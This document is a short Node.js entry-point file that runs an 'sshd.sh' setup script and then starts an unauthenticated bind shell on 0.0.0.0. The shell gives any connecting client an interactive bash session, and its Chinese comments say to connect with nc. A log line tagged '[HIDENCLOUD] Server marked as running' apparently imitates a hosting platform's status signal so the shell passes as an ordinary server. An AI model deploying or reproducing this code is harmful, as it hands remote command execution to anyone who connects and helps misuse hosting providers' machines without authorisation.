// index.mjs
import net from 'net';
import { spawn } from 'child_process';
import { fileURLToPath } from 'url';
import path from 'path';

const PORT = process.env.SERVER_PORT;
console.log(`SERVER_PORT=${PORT}`);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

function runCommand(command, args = [], options = {}) {
  return new Promise((resolve, reject) => {
    console.log(`\n==> Running: ${command} ${args.join(' ')}`);

    const child = spawn(command, args, {
      cwd: options.cwd ?? __dirname,
      env: options.env ?? process.env,

      // 关键：stdout/stderr/stdin 直接转发到当前 node 进程
      stdio: 'inherit',
    });

    child.on('error', (err) => {
      reject(err);
    });

    child.on('close', (code, signal) => {
      if (code === 0) {
        console.log(`==> Finished: ${command}`);
        resolve();
      } else {
        reject(
          new Error(
            `Command failed: ${command} ${args.join(' ')}; code=${code}; signal=${signal}`
          )
        );
      }
    });
  });
}

async function runSetupScripts() {
  await runCommand(path.join(__dirname, 'sshd.sh'), [PORT]);
  console.log("change this text 1"); // [HIDENCLOUD] Server marked as running...
}

function startServer() {
  const server = net.createServer((socket) => {
    console.log('新连接来自:', socket.remoteAddress);

    const sh = spawn('/bin/bash', ['-i'], {
      stdio: ['pipe', 'pipe', 'pipe'],
    });

    socket.pipe(sh.stdin);
    sh.stdout.pipe(socket);
    sh.stderr.pipe(socket);

    socket.on('close', () => {
      console.log('连接断开，终止 shell');
      sh.kill();
    });

    sh.on('close', () => {
      console.log('Shell 退出，断开 socket');
      socket.end();
    });

    socket.on('error', () => {});
    sh.on('error', (err) => {
      console.error('Shell 启动失败:', err);
      socket.end();
    });
  });

  server.listen(PORT, '0.0.0.0', () => {
    console.log(`Bind shell 监听 0.0.0.0:${PORT}，使用 nc 连接即可`);
  });
}

async function main() {
  try {
    await runSetupScripts();
    console.log('\n前置脚本全部完成，启动主逻辑。');
  } catch (err) {
    console.error('\n前置脚本失败，但仍然继续启动主逻辑。');
    console.error(err);
  }

  startServer();
}

main();
